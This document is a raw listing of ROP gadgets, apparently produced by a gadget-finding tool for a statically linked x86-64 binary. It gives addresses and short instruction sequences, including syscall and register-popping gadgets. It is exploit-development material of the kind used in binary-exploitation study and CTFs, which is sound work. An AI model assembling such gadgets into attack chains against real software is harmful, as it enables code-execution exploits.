0x00000000004a76a6 : add byte ptr [rax], al ; ret 0x33
0x00000000004a5cde : add byte ptr [rax], al ; ret 0xa
0x00000000004a60de : add byte ptr [rax], al ; ret 0xd
0x00000000004a9582 : add byte ptr [rax], al ; ret 1
0x00000000004a9782 : add byte ptr [rax], al ; ret 2
0x00000000004a9982 : add byte ptr [rax], al ; ret 3
0x00000000004a9b82 : add byte ptr [rax], al ; ret 4
0x00000000004a9d82 : add byte ptr [rax], al ; ret 5
0x00000000004a5886 : add byte ptr [rax], al ; ret 6
0x00000000004aa182 : add byte ptr [rax], al ; ret 7
0x00000000004aa382 : add byte ptr [rax], al ; ret 8
0x00000000004aa582 : add byte ptr [rax], al ; ret 9
0x00000000004a9b7e : add byte ptr [rax], al ; rol byte ptr [rax + rax], 0 ; ret 4
0x00000000004a5f86 : add byte ptr [rax], al ; ror byte ptr [rax + rax], 0 ; ret
0x00000000004b5c3e : add byte ptr [rax], al ; sal cl, 0xf6 ; jmp rsi
0x00000000004bcf7e : add byte ptr [rax], al ; sar byte ptr [rax - 3], 1 ; call qword ptr [rbx]
0x00000000004ba3ba : add byte ptr [rax], al ; sar byte ptr [rcx], 0 ; jo 0x4ba3bb ; sti ; jmp qword ptr [rbx]
0x00000000004b7112 : add byte ptr [rax], al ; sbb byte ptr [rdi], al ; add al, cl ; jbe 0x4b711d ; call qword ptr [rdx]
0x00000000004b8726 : add byte ptr [rax], al ; sbb byte ptr [rdx + rdi*8], dl ; call qword ptr [rdi]
0x00000000004b7f86 : add byte ptr [rax], al ; sbb dh, cl ; stc ; jmp qword ptr [rax]
0x00000000004b38e6 : add byte ptr [rax], al ; sbb rsi, rsi ; jmp qword ptr [rax]
0x00000000004257ac : add byte ptr [rax], al ; shr ecx, 3 ; rep stosq qword ptr [rdi], rax ; pop rbx ; ret
0x00000000004bc78a : add byte ptr [rax], al ; sub bh, ch ; jmp rsp
0x00000000004b9222 : add byte ptr [rax], al ; sub byte ptr [rax], ch ; add byte ptr [rax], bh ; movsb byte ptr [rdi], byte ptr [rsi] ; cli ; call qword ptr [rax]
0x00000000004b8722 : add byte ptr [rax], al ; sub byte ptr [rbp], bl ; add byte ptr [rax], bl ; adc al, 0xfa ; call qword ptr [rdi]
0x00000000004bc756 : add byte ptr [rax], al ; sub byte ptr [rdx], ch ; std ; jmp qword ptr [rcx]
0x00000000004b90e6 : add byte ptr [rax], al ; sub cl, ch ; std ; call rdx
0x00000000004b830e : add byte ptr [rax], al ; sub dh, 0xfd ; jmp qword ptr [rdx]
0x0000000000433a4c : add byte ptr [rax], al ; sub eax, ecx ; ret
0x000000000041e4d6 : add byte ptr [rax], al ; sub r8, rcx ; lea eax, dword ptr [r8 - 1] ; ret
0x000000000044d561 : add byte ptr [rax], al ; sub rax, rdx ; ret
0x0000000000452875 : add byte ptr [rax], al ; syscall ; pop rdx ; pop rsi ; ret
0x000000000047ba23 : add byte ptr [rax], al ; syscall ; ret
0x0000000000452719 : add byte ptr [rax], al ; test eax, eax ; cmove eax, edx ; ret
0x00000000004b8106 : add byte ptr [rax], al ; test r12b, r14b ; jmp qword ptr [rbx]
0x0000000000400409 : add byte ptr [rax], al ; test rax, rax ; je 0x400419 ; call rax
0x000000000043234e : add byte ptr [rax], al ; vzeroupper ; xor eax, eax ; ret
0x00000000004bbd3a : add byte ptr [rax], al ; xchg eax, ebx ; add byte ptr [rax], al ; rcr ch, 1 ; cld ; jmp qword ptr [rcx]
0x00000000004b8baa : add byte ptr [rax], al ; xchg eax, esp ; cli ; call qword ptr [rdx]
0x00000000004b357e : add byte ptr [rax], al ; xchg eax, esp ; cmc ; jmp qword ptr [rax]
0x00000000004b923a : add byte ptr [rax], al ; xor al, 0xa4 ; cli ; call qword ptr [rdx]
0x00000000004b718e : add byte ptr [rax], al ; xor byte ptr [rax - 7], bh ; call qword ptr [rbx]
0x00000000004b6a4e : add byte ptr [rax], al ; xor byte ptr [rax - 9], cl ; jmp qword ptr [rbx]
0x00000000004bb42a : add byte ptr [rax], al ; xor byte ptr [rdx + 0x514a0000], cl ; hlt ; jmp qword ptr [rcx]
0x00000000004b8bee : add byte ptr [rax], al ; xor dh, ah ; std ; jmp qword ptr [rdi]
0x0000000000463617 : add byte ptr [rax], al ; xor eax, eax ; add rsp, 8 ; ret
0x000000000047c936 : add byte ptr [rax], al ; xor eax, eax ; leave ; ret
0x0000000000415603 : add byte ptr [rax], al ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000493f95 : add byte ptr [rax], al ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x0000000000401dae : add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000043229a : add byte ptr [rax], al ; xor eax, eax ; vzeroupper ; ret
0x000000000045e556 : add byte ptr [rax], al ; xor r9d, r9d ; call r15
0x000000000044b61e : add byte ptr [rax], al ; xor rax, rax ; ret
0x00000000004b8f33 : add byte ptr [rax], bh ; add byte ptr gs:[rax], al ; call 0x124b89cd
0x00000000004b6e87 : add byte ptr [rax], bh ; cmp bh, cl ; jmp qword ptr [rbx]
0x0000000000400ed8 : add byte ptr [rax], bh ; leave ; ret
0x00000000004b9227 : add byte ptr [rax], bh ; movsb byte ptr [rdi], byte ptr [rsi] ; cli ; call qword ptr [rax]
0x00000000004b8727 : add byte ptr [rax], bl ; adc al, 0xfa ; call qword ptr [rdi]
0x00000000004b6cf7 : add byte ptr [rax], bl ; mov eax, edi ; call qword ptr [rax]
0x00000000004b7857 : add byte ptr [rax], ch ; cwde ; stc ; jmp qword ptr [rcx]
0x00000000004b8723 : add byte ptr [rax], ch ; pop rbp ; add byte ptr [rax], al ; sbb byte ptr [rdx + rdi*8], dl ; call qword ptr [rdi]
0x00000000004b9223 : add byte ptr [rax], ch ; push -0x5bc80000 ; cli ; call qword ptr [rax]
0x00000000004bc757 : add byte ptr [rax], ch ; sub bh, ch ; jmp qword ptr [rcx]
0x000000000049b73c : add byte ptr [rax], cl ; cli ; call qword ptr [rax + 0x20fffa07]
0x00000000004b7bb7 : add byte ptr [rax], cl ; lodsb al, byte ptr [rsi] ; stc ; jmp qword ptr [rcx]
0x000000000049255e : add byte ptr [rax], cl ; mov byte ptr [rip + 0x231c89], 8 ; ret
0x00000000004b8103 : add byte ptr [rax], cl ; push rdi ; add byte ptr [rax], al ; test r12b, r14b ; jmp qword ptr [rbx]
0x0000000000492565 : add byte ptr [rax], cl ; ret
0x00000000004bd303 : add byte ptr [rax], cl ; test eax, 0x8db80000 ; std ; call qword ptr [rdx]
0x00000000004b718f : add byte ptr [rax], dh ; js 0x4b7190 ; call qword ptr [rbx]
0x00000000004bb42b : add byte ptr [rax], dh ; mov al, byte ptr [rax] ; add byte ptr [rdx + 0x51], cl ; hlt ; jmp qword ptr [rcx]
0x00000000004b920f : add byte ptr [rax], dh ; movsb byte ptr [rdi], byte ptr [rsi] ; cli ; call qword ptr [rbx]
0x00000000004b8bef : add byte ptr [rax], dh ; out 0xfd, al ; jmp qword ptr [rdi]
0x00000000004b7cef : add byte ptr [rax], dh ; scasb al, byte ptr [rdi] ; stc ; call qword ptr [rcx]
0x00000000004b6d1f : add byte ptr [rax], dh ; stosd dword ptr [rdi], eax ; clc ; call qword ptr [rax]
0x00000000004b830b : add byte ptr [rax], dl ; pop rcx ; add byte ptr [rax], al ; sub dh, 0xfd ; jmp qword ptr [rdx]
0x00000000004b920b : add byte ptr [rax], dl ; push -0x5bd00000 ; cli ; call qword ptr [rbx]
0x00000000004b999f : add byte ptr [rax], dl ; ret
0x00000000004bca0f : add byte ptr [rax], dl ; std ; call qword ptr [rdx]
0x00000000004b545f : add byte ptr [rax], dl ; test al, 0xf6 ; call qword ptr [rsi]
0x00000000004b9998 : add byte ptr [rax], r8b ; add byte ptr [rax + 0x1000006f], ah ; ret
0x0000000000451cad : add byte ptr [rax], r8b ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00000000004b6e85 : add byte ptr [rax], r8b ; cmp byte ptr [rdx], bh ; stc ; jmp qword ptr [rbx]
0x00000000004b786d : add byte ptr [rax], r8b ; cwde ; stc ; jmp qword ptr [rcx]
0x00000000004b7039 : add byte ptr [rax], r8b ; hlt ; insb byte ptr [rdi], dx ; stc ; call rsp
0x000000000042a1fd : add byte ptr [rax], r8b ; mov eax, 0x16 ; ret
0x000000000041f28d : add byte ptr [rax], r8b ; mov eax, 0xffffffff ; ret
0x000000000041edfd : add byte ptr [rax], r8b ; mov eax, dword ptr [rdi + 0x10] ; sub eax, dword ptr [rsi + 0x10] ; ret
0x000000000044ac4d : add byte ptr [rax], r8b ; mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; ret
0x000000000044ac8d : add byte ptr [rax], r8b ; mov rdx, qword ptr [rsi] ; mov qword ptr [rdi], rdx ; ret
0x0000000000426d75 : add byte ptr [rax], r8b ; mov rsi, qword ptr [rsp + 0x68] ; call rax
0x00000000004b7885 : add byte ptr [rax], r8b ; pop rax ; cwde ; stc ; jmp qword ptr [rcx]
0x0000000000400ad5 : add byte ptr [rax], r8b ; pop rbp ; ret
0x000000000048b7fd : add byte ptr [rax], r8b ; pop rbx ; ret
0x0000000000400a9d : add byte ptr [rax], r8b ; ret
0x000000000044d01d : add byte ptr [rax], r8b ; xor eax, eax ; ret
0x0000000000450056 : add byte ptr [rbp + 0x10], dh ; add rsp, 0x28 ; ret
0x000000000048bc0f : add byte ptr [rbp + 0x12], dh ; add rsp, 0x38 ; ret
0x0000000000494c83 : add byte ptr [rbp + 0x1a], dh ; ret
0x000000000047c50d : add byte ptr [rbp + 0x1b], dh ; add rsp, 0x38 ; ret
0x000000000044f29e : add byte ptr [rbp + 0x23], dh ; add rsp, 0x20 ; pop rbx ; ret
0x0000000000488a14 : add byte ptr [rbp + 0x27], dh ; add rsp, 0x68 ; ret
0x0000000000488954 : add byte ptr [rbp + 0x2c], dh ; add rsp, 0x38 ; ret
0x0000000000419b5a : add byte ptr [rbp + 0x31], al ; dec dword ptr [rax + 0x39] ; ret 0x860f
0x000000000045e557 : add byte ptr [rbp + 0x31], al ; leave ; call r15
0x0000000000488b75 : add byte ptr [rbp + 0x36], dh ; add rsp, 0x78 ; ret
0x000000000048ae80 : add byte ptr [rbp + 0x3b], dh ; leave ; ret
0x000000000045116f : add byte ptr [rbp + 0x41], bl ; pop rsp ; jmp rax
0x00000000004010d5 : add byte ptr [rbp + 0x41], bl ; pop rsp ; pop r13 ; pop r14 ; ret
0x0000000000450286 : add byte ptr [rbp + 0x42], dh ; add rsp, 0x58 ; ret
0x000000000047c3db : add byte ptr [rbp + 0x45], dh ; add rsp, 0x58 ; ret
0x000000000041ceb7 : add byte ptr [rbp + 0x4a], dh ; add rsp, 0x38 ; pop rbx ; pop rbp ; ret
0x0000000000450616 : add byte ptr [rbp + 0x4a], dh ; add rsp, 0x68 ; ret
0x0000000000489aaf : add byte ptr [rbp + 0xf], cl ; lodsd eax, dword ptr [rsi] ; ret
0x000000000048999f : add byte ptr [rbp + 0xf], cl ; movsd dword ptr [rdi], dword ptr [rsi] ; ret
0x0000000000450f85 : add byte ptr [rbp + 0xf], dh ; add rsp, 0x28 ; ret
0x000000000048ef6a : add byte ptr [rbp + 0xf], dh ; add rsp, 0x38 ; ret
0x000000000048e3da : add byte ptr [rbp + 2], dh ; pop rbx ; ret
0x00000000004618ce : add byte ptr [rbp + 5], dh ; add rsp, 0x18 ; ret
0x000000000048bb2c : add byte ptr [rbp + 5], dh ; add rsp, 0x38 ; ret
0x0000000000420a3f : add byte ptr [rbp + 6], dh ; add rsp, 0x20 ; pop rbx ; ret
0x0000000000493db8 : add byte ptr [rbp + rax + 0x48], dh ; mov dword ptr [rdi + rsi*8], edx ; ret
0x0000000000493cd0 : add byte ptr [rbp + rbx + 0x48], dh ; add esp, 0x18 ; ret
0x00000000004bc787 : add byte ptr [rbp + rbx*4 + 0x2a640000], cl ; std ; jmp rsp
0x00000000004a60d7 : add byte ptr [rbp + rcx + 0xdbf0000], bh ; add byte ptr [rax], al ; ret 0xd
0x0000000000425a9b : add byte ptr [rbp + rcx*4 + 0x46], cl ; dec dword ptr [rax - 0x77] ; ret 0x2948
0x0000000000478c6e : add byte ptr [rbp + rcx*4 + 0x4c], cl ; and al, 0x10 ; mov rdi, r12 ; call rbx
0x0000000000478d68 : add byte ptr [rbp + rcx*4 + 0x4c], cl ; and al, 0x18 ; mov rdi, r12 ; call rbx
0x0000000000478e62 : add byte ptr [rbp + rcx*4 + 0x4d], cl ; ror byte ptr [rcx + rcx*4 - 1], 0x41 ; call rsp
0x00000000004227aa : add byte ptr [rbp + rcx*4 + 5], cl ; ret 0x778
0x0000000000496d14 : add byte ptr [rbp - 0x1f], dh ; pop rbx ; ret
0x000000000045271a : add byte ptr [rbp - 0x3dbbf040], al ; ret
0x00000000004a6383 : add byte ptr [rbp - 0x3ffffff1], bh ; sldt word ptr [rax] ; ret
0x000000000040185c : add byte ptr [rbp - 0x40], dh ; ret
0x000000000044f8f7 : add byte ptr [rbp - 0x57c03b0], cl ; add ecx, dword ptr [rdi] ; xchg eax, esi ; ret 0xd284
0x000000000046f8e9 : add byte ptr [rbp - 0x75], cl ; je 0x46f91a ; and byte ptr [rax + 1], cl ; ret
0x0000000000401b75 : add byte ptr [rbp - 0xcf98b40], al ; ret
0x00000000004960a7 : add byte ptr [rbp - 0xcfb8b40], al ; ret
0x00000000004b6990 : add byte ptr [rbp - 9], al ; jmp qword ptr [rbx]
0x0000000000443c19 : add byte ptr [rbx + 0x148b8104], cl ; xchg eax, ecx ; sub eax, edx ; ret
0x00000000004980a3 : add byte ptr [rbx + 0x22976a3d], cl ; add byte ptr [rax - 0x77], cl ; ret 0x8348
0x000000000048bf0d : add byte ptr [rbx + 0x23828c0d], cl ; add byte ptr [rax - 0x77], cl ; ret 0xc148
0x00000000004868f5 : add byte ptr [rbx + 0x23b8eb0d], al ; add byte ptr [rcx], al ; pop rbx ; ret
0x000000000042a37f : add byte ptr [rbx + 0x299aaa15], cl ; add bh, dh ; ret 0
0x0000000000426cef : add byte ptr [rbx + 0x29ab1e3d], cl ; add byte ptr [rax - 0x77], cl ; ret 0x8348
0x000000000041f1c7 : add byte ptr [rbx + 0x2a4b8505], al ; add byte ptr [rcx], al ; ret
0x00000000004207bf : add byte ptr [rbx + 0x31], bl ; rcr byte ptr [rbp + 0x41], 0x5c ; ret
0x000000000045e78b : add byte ptr [rbx + 0x41], bl ; pop rsp ; ret
0x000000000044ac5f : add byte ptr [rbx + 0x477880e], cl ; mov dword ptr [rdi], ecx ; ret
0x000000000044a78f : add byte ptr [rbx + 0x48028901], cl ; lea eax, dword ptr [rdx + 3] ; ret
0x000000000043baff : add byte ptr [rbx + 0x5789fc56], cl ; cld ; ret
0x000000000042847f : add byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; pop r14 ; jmp rax
0x0000000000418e68 : add byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; pop r14 ; ret
0x000000000041acb4 : add byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x000000000040135d : add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x000000000041661b : add byte ptr [rbx + 0x5d], bl ; ret
0x0000000000460abf : add byte ptr [rbx + 0x63], cl ; xor al, 0x88 ; add rsi, r8 ; jmp rsi
0x00000000004960ff : add byte ptr [rbx + 0x75c08507], cl ; or dh, bl ; ret
0x000000000047a8aa : add byte ptr [rbx + rax - 0xd], dh ; ret
0x00000000004b6d07 : add byte ptr [rbx + rax*2], cl ; add byte ptr [rax], al ; adc al, 0x89 ; clc ; jmp qword ptr [rsi]
0x0000000000493d77 : add byte ptr [rbx + rbx*8 - 0xd], dh ; ret
0x000000000041b76d : add byte ptr [rbx + rcx*4 + 0x2d], cl ; ret
0x000000000048b057 : add byte ptr [rbx + rcx*4 + 0x57], cl ; or byte ptr [rcx + 0x29], cl ; ret 0x894c
0x000000000048ee77 : add byte ptr [rbx + rcx*4 + 0x57], cl ; or byte ptr [rcx + 1], cl ; ret 0x894c
0x0000000000453fcf : add byte ptr [rbx - 0x18], dl ; mov edx, 0x89000281 ; ret
0x000000000044ec88 : add byte ptr [rbx - 0x3d], bl ; mov eax, 0x10 ; pop rbx ; ret
0x000000000044ec96 : add byte ptr [rbx - 0x3d], bl ; mov eax, 0x20 ; pop rbx ; ret
0x000000000044ec8f : add byte ptr [rbx - 0x3d], bl ; mov eax, 0x30 ; pop rbx ; ret
0x000000000044eca4 : add byte ptr [rbx - 0x3d], bl ; mov eax, 0x40 ; pop rbx ; ret
0x000000000044ec9d : add byte ptr [rbx - 0x3d], bl ; mov eax, 0x60 ; pop rbx ; ret
0x000000000044ec81 : add byte ptr [rbx - 0x3d], bl ; mov eax, 8 ; pop rbx ; ret
0x0000000000478ab9 : add byte ptr [rbx - 0x3d], bl ; nop dword ptr [rax] ; ret
0x0000000000473b5f : add byte ptr [rbx - 0x4f743], al ; jmp qword ptr [rax]
0x000000000044eefe : add byte ptr [rbx - 0x50f0fe40], al ; ret 0xf8e9
0x000000000046cb6c : add byte ptr [rbx - 0x77], bl ; rcr byte ptr [rbp + 0x41], 1 ; pop rsp ; ret
0x000000000044cc46 : add byte ptr [rbx - 0x7bf0ed07], al ; ret 2
0x000000000040d865 : add byte ptr [rbx - 0x7bf0fc06], al ; ret
0x0000000000411596 : add byte ptr [rbx - 0x7bf0fc08], al ; ret
0x0000000000417668 : add byte ptr [rbx - 0x7bf0fd08], al ; ret
0x000000000040e5dc : add byte ptr [rbx - 0x7bf0fe02], al ; ret 0x1b
0x00000000004107af : add byte ptr [rbx - 0x7bf0fe08], al ; ret
0x0000000000410852 : add byte ptr [rbx - 0x7bf0fe08], al ; ret 4
0x0000000000401327 : add byte ptr [rbx - 0x7cb7ffbb], cl ; ret
0x0000000000495b1f : add byte ptr [rbx - 0x7fbf8f19], al ; jmp qword ptr [rax]
0x0000000000482267 : add byte ptr [rbx], al ; add byte ptr [rax], al ; ret
0x000000000046de25 : add byte ptr [rcx + 0x29], cl ; ret
0x000000000041805f : add byte ptr [rcx + 0x2b], cl ; adc byte ptr [r8 + 1], r9b ; ret
0x0000000000417fc6 : add byte ptr [rcx + 0x2b], cl ; and byte ptr [r8 + 1], r9b ; ret
0x00000000004905d2 : add byte ptr [rcx + 0x348b4cd8], cl ; ret 0xf41
0x000000000047a46f : add byte ptr [rcx + 0x39], cl ; ret
0x00000000004166dd : add byte ptr [rcx + 0x415d5be8], cl ; pop rsp ; ret
0x000000000041fc60 : add byte ptr [rcx + 0x4789246f], cl ; adc byte ptr [rbx + 0x5d], bl ; ret
0x00000000004196d0 : add byte ptr [rcx + 0x5c], al ; pop r13 ; pop r14 ; ret
0x00000000004785fc : add byte ptr [rcx + 0x5d5b7453], cl ; pop r12 ; ret
0x000000000043449e : add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x0000000000491c16 : add byte ptr [rcx + 0x63], cl ; add al, 0x87 ; add rax, r15 ; jmp rax
0x0000000000460fbe : add byte ptr [rcx + 0x63], cl ; cmp al, 0xb3 ; add rdi, r11 ; jmp rdi
0x0000000000432cfc : add byte ptr [rcx + 0x63], cl ; or al, 0x93 ; add rcx, r11 ; jmp rcx
0x000000000044aad8 : add byte ptr [rcx + 0x63], cl ; or al, 0x93 ; lea rcx, qword ptr [r11 + rcx] ; jmp rcx
0x0000000000467671 : add byte ptr [rcx + 0x63], cl ; ret 0x8944
0x000000000047342a : add byte ptr [rcx + 0x63], cl ; ret 0x8948
0x00000000004b8ba7 : add byte ptr [rcx + 0x67940000], ch ; cli ; call qword ptr [rdx]
0x000000000048c5c6 : add byte ptr [rcx + 0xc8b48d8], cl ; ret 0xb60f
0x0000000000470138 : add byte ptr [rcx + 0xf], al ; mov dh, 0x46 ; or al, 0x83 ; ret
0x00000000004743ab : add byte ptr [rcx + 0xf], al ; ret 0x3941
0x000000000046897e : add byte ptr [rcx + 0xf], al ; ret 0xc839
0x000000000046d9d7 : add byte ptr [rcx + 0xf], al ; xchg eax, esp ; ret
0x00000000004729ee : add byte ptr [rcx + 1], al ; ret 0x8b48
0x000000000044d34f : add byte ptr [rcx + 1], cl ; ret
0x0000000000414a75 : add byte ptr [rcx + 1], cl ; ret 0x149
0x0000000000492e65 : add byte ptr [rcx + 1], cl ; ret 0xef89
0x000000000041fc3d : add byte ptr [rcx + rax + 0x57], al ; sbb byte ptr [rax + 0x39], cl ; ret
0x0000000000408b22 : add byte ptr [rcx + rax - 0x18], cl ; jmp rax
0x00000000004b7ea3 : add byte ptr [rcx + rax*8 - 7], bh ; jmp qword ptr [rdx]
0x00000000004b7903 : add byte ptr [rcx + rbx*4 - 7], bl ; call rsi
0x000000000041d564 : add byte ptr [rcx + rcx - 0xd], dh ; ret
0x00000000004975ce : add byte ptr [rcx + rcx*4 + 0x2d], cl ; ret 0x22b4
0x0000000000498c5f : add byte ptr [rcx + rcx*4 - 0x11], cl ; call rax
0x000000000040a936 : add byte ptr [rcx + rcx*4 - 0x19], cl ; call 0x426b86
0x000000000047a6cf : add byte ptr [rcx + rcx*4 - 0x40], cl ; vzeroupper ; ret
0x00000000004947ff : add byte ptr [rcx + rcx*4 - 0xa], cl ; mov rdi, r12 ; call r15
0x00000000004983bf : add byte ptr [rcx + rcx*4 - 1], cl ; call rax
0x00000000004b6d0b : add byte ptr [rcx + rcx*4], dl ; clc ; jmp qword ptr [rsi]
0x000000000042a91f : add byte ptr [rcx + rcx*8 - 0x7cb7dd8c], al ; ret 0x4801
0x0000000000426118 : add byte ptr [rcx + rdi - 0x3e], cl ; jne 0x4260e7 ; ret
0x000000000049b1fc : add byte ptr [rcx + rdi*8 - 1], dl ; jo 0x49b25e ; stc ; jmp rax
0x000000000045c06f : add byte ptr [rcx - 0x46], al ; add eax, 0xe9000000 ; ret
0x000000000049b440 : add byte ptr [rcx - 0x4d2f0007], dh ; stc ; call rax
0x00000000004aacb4 : add byte ptr [rcx - 0x56ff0004], ch ; cld ; call rax
0x00000000004aaca4 : add byte ptr [rcx - 0x56ff0004], ch ; cld ; jmp rax
0x0000000000485c7b : add byte ptr [rcx - 0x75], al ; adc edi, dword ptr [rcx] ; ret 0x840f
0x0000000000485d18 : add byte ptr [rcx - 0x75], al ; adc edi, dword ptr [rcx] ; ret 0xc74
0x0000000000414ae7 : add byte ptr [rcx - 0x75], cl ; add byte ptr [r8 - 0x7d], r9b ; ret
0x0000000000451dba : add byte ptr [rcx - 0x75], cl ; jge 0x451dc5 ; call r12
0x0000000000451dea : add byte ptr [rcx - 0x75], cl ; jge 0x451df5 ; call r12
0x0000000000498d6f : add byte ptr [rcx - 0x75], cl ; pop rax ; or byte ptr [rbp - 0x77], cl ; ret
0x0000000000452887 : add byte ptr [rcx - 0x77], al ; ret
0x0000000000472dee : add byte ptr [rcx - 0x77], al ; ret 0x1674
0x0000000000465647 : add byte ptr [rcx - 0x77], cl ; ret
0x000000000040b160 : add byte ptr [rcx - 0x77], cl ; ret 0x149
0x0000000000498412 : add byte ptr [rcx - 0x77], cl ; ret 0x8349
0x00000000004808e4 : add byte ptr [rcx - 0x77], cl ; ret 0x848b
0x000000000049159a : add byte ptr [rcx - 0x77], cl ; ror byte ptr [rax - 0x77], 1 ; ret 0x3575
0x00000000004916a9 : add byte ptr [rcx - 0x7b], cl ; ret 0x840f
0x00000000004780bb : add byte ptr [rcx - 0x7cb7e8f4], cl ; ret 0x4804
0x0000000000461e17 : add byte ptr [rcx - 0x7d], cl ; call qword ptr [rbx]
0x00000000004238f7 : add byte ptr [rcx - 0x7d], cl ; ret
0x000000000041fe7f : add byte ptr [rcx - 0x7d], cl ; ret 0x4908
0x000000000046208e : add byte ptr [rcx - 0x7d], cl ; ret 0x6601
0x000000000042cb5f : add byte ptr [rcx - 0x7d], cl ; ret 0x7f10
0x000000000042b46f : add byte ptr [rcx - 0x7d], cl ; ret 0xf10
0x00000000004022d0 : add byte ptr [rcx - 9], al ; ret 0x200
0x0000000000432522 : add byte ptr [rcx - 9], cl ; ret 1
0x0000000000432548 : add byte ptr [rcx - 9], cl ; ret 2
0x000000000049206a : add byte ptr [rcx], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; fucompi st(1) ; ret
0x000000000044d55f : add byte ptr [rcx], al ; add byte ptr [rax], al ; sub rax, rdx ; ret
0x00000000004154ef : add byte ptr [rcx], al ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000400b4b : add byte ptr [rcx], al ; pop rbp ; ret
0x00000000004868fb : add byte ptr [rcx], al ; pop rbx ; ret
0x000000000041f1cd : add byte ptr [rcx], al ; ret
0x0000000000453fdc : add byte ptr [rcx], bh ; ret
0x000000000047eb9c : add byte ptr [rcx], dh ; fisttp dword ptr [rax - 0x7d] ; ret
0x000000000048a7c6 : add byte ptr [rcx], dh ; imul al ; ret 0xf75c
0x0000000000415604 : add byte ptr [rcx], dh ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x0000000000431e2c : add byte ptr [rcx], dh ; rol bl, 0x83 ; ret 0x6620
0x000000000047c54a : add byte ptr [rcx], dh ; ror byte ptr [rax + 0x39], 0xd7 ; ja 0x47c581 ; ret
0x000000000041b28f : add byte ptr [rcx], dh ; ror byte ptr [rax - 0x7b], 0xd2 ; jne 0x41b2a9 ; ret
0x0000000000453ffb : add byte ptr [rcx], dh ; sar byte ptr [rcx], cl ; ret
0x000000000043994a : add byte ptr [rdi + 0x63], cl ; or al, 0x8b ; add r9, r11 ; jmp r9
0x0000000000493ae5 : add byte ptr [rdi + 1], bh ; call r14
0x0000000000493b0d : add byte ptr [rdi + 1], bh ; call rax
0x000000000049485c : add byte ptr [rdi + 2], dh ; sbb eax, eax ; ret
0x00000000004b70ff : add byte ptr [rdi + rax*2], al ; add byte ptr [rax], al ; in al, dx ; jne 0x4b7108 ; jmp rbx
0x0000000000469fa5 : add byte ptr [rdi + rcx - 0x4a], al ; or al, 0x89 ; ret 0xc689
0x00000000004b78ff : add byte ptr [rdi + rcx*2], al ; add byte ptr [rax], al ; pop rsp ; cdq ; stc ; call rsi
0x00000000004b84cb : add byte ptr [rdi + rsi*8 - 7], dh ; jmp qword ptr [rdx]
0x00000000004b8107 : add byte ptr [rdi - 0x7c], cl ; hlt ; jmp qword ptr [rbx]
0x000000000049b220 : add byte ptr [rdi - 7], bl ; push rax ; pop rdi ; stc ; jmp rax
0x000000000049bc34 : add byte ptr [rdi], ch ; cli ; call qword ptr [rax + 0x20fffa2e]
0x0000000000414516 : add byte ptr [rdi], cl ; add eax, 0x8944c689 ; ret 0xeab8
0x0000000000487c16 : add byte ptr [rdi], cl ; add eax, 0x940fc085 ; ret 0x3d
0x000000000043b2c6 : add byte ptr [rdi], cl ; cmp dword ptr [rbx - 1], -1 ; dec dword ptr [rax - 0x7f] ; ret 0x80
0x000000000044eb57 : add byte ptr [rdi], cl ; lahf ; ret 0xea81
0x000000000043c2ff : add byte ptr [rdi], cl ; mov bh, 0x16 ; mov word ptr [rdi], dx ; ret
0x000000000043c36f : add byte ptr [rdi], cl ; mov dh, 0x16 ; mov byte ptr [rdi], dl ; ret
0x000000000044ec0f : add byte ptr [rdi], cl ; mov dh, 0xc1 ; pop rbx ; ret
0x000000000042c70f : add byte ptr [rdi], cl ; mov dh, 0xe ; movzx eax, byte ptr [rdi] ; sub eax, ecx ; ret
0x00000000004196df : add byte ptr [rdi], cl ; mov dh, 2 ; ret
0x0000000000432a8f : add byte ptr [rdi], cl ; mov dh, 7 ; movzx ecx, byte ptr [rsi] ; sub eax, ecx ; ret
0x00000000004325cf : add byte ptr [rdi], cl ; mov dh, 7 ; movzx edx, byte ptr [rsi] ; sub eax, edx ; ret
0x0000000000469183 : add byte ptr [rdi], cl ; mov ds, word ptr [rax + rax + 0x63490000] ; ret 0x8944
0x0000000000431e5f : add byte ptr [rdi], cl ; mov esp, 0x448d48c0 ; cmp al, dh ; ret
0x0000000000431e8f : add byte ptr [rdi], cl ; mov esp, 0x448d48c0 ; cmp byte ptr [rax], ah ; ret
0x0000000000431e7f : add byte ptr [rdi], cl ; mov esp, 0x448d48c0 ; cmp byte ptr [rax], dl ; ret
0x0000000000431e6f : add byte ptr [rdi], cl ; mov esp, 0xf80148c0 ; ret
0x0000000000473424 : add byte ptr [rdi], cl ; mov ss, word ptr [rax + rax + 0x63490000] ; ret 0x8948
0x00000000004825c3 : add byte ptr [rdi], cl ; ret 0x8d48
0x000000000045f4fb : add byte ptr [rdi], cl ; ret 0xc083
0x000000000042868e : add byte ptr [rdi], cl ; test ebx, edi ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x0000000000470598 : add byte ptr [rdi], cl ; xchg dword ptr [rdx + rbx], esp ; add byte ptr [rax - 0x7d], cl ; ret
0x00000000004019d0 : add byte ptr [rdi], cl ; xchg eax, ebp ; ret 0x2948
0x00000000004270ee : add byte ptr [rdi], cl ; xchg eax, ebx ; ret 0x3d83
0x000000000047d443 : add byte ptr [rdi], cl ; xchg eax, esp ; ret 0xc283
0x0000000000456464 : add byte ptr [rdi], cl ; xchg eax, esp ; ret 0xd5e9
0x000000000044a74f : add byte ptr [rdx + 0x48028801], cl ; lea eax, dword ptr [rdx] ; ret
0x0000000000448f9f : add byte ptr [rdx + 0x48028801], cl ; mov eax, edi ; ret
0x0000000000493ce7 : add byte ptr [rdx + 0x48], dh ; add esp, 0x18 ; ret
0x00000000004bb42f : add byte ptr [rdx + 0x51], cl ; hlt ; jmp qword ptr [rcx]
0x0000000000482cfc : add byte ptr [rdx + 0x63], cl ; add al, 0xa1 ; add rax, rcx ; jmp rax
